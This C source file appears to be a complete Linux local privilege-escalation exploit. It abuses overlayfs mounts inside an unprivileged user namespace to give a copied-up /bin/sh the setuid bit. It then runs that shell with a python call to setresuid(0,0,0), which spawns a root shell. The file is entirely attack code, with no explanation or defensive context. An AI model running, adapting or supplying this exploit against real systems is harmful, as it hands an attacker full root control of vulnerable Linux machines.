#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <linux/sched.h>
#include <sys/wait.h>
 
static char child_stack[1024*1024];
 
static int
child_exec(void *stuff)
{
    system("rm -rf /tmp/haxhax");
    mkdir("/tmp/haxhax", 0777);
    mkdir("/tmp/haxhax/w", 0777);
    mkdir("/tmp/haxhax/u",0777);
    mkdir("/tmp/haxhax/o",0777);
 
    if (mount("overlay", "/tmp/haxhax/o", "overlay", MS_MGC_VAL, "lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w") != 0) {
    fprintf(stderr,"mount failed..\n");
    }
 
    chmod("/tmp/haxhax/w/work",0777);
    chdir("/tmp/haxhax/o");
    chmod("sh",04755);
    chdir("/");
    umount("/tmp/haxhax/o");
    return 0;
}
 
int
main(int argc, char **argv)
{
    int status;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;
    struct stat s;
 
    if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");
 
        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }
 
            waitpid(pid, &status, 0);
 
        }
 
        waitpid(init, &status, 0);
        return 0;
    }
 
    usleep(300000);
 
    wait(NULL);
 
    stat("/tmp/haxhax/u/sh",&s);
 
    if(s.st_mode == 0x89ed)
        execl("/tmp/haxhax/u/sh","sh","-p","-c","rm -rf /tmp/haxhax;python -c \"import os;os.setresuid(0,0,0);os.execl('/bin/sh','sh');\"",NULL);
 
    fprintf(stderr,"couldn't create suid :(\n");
    return -1;
}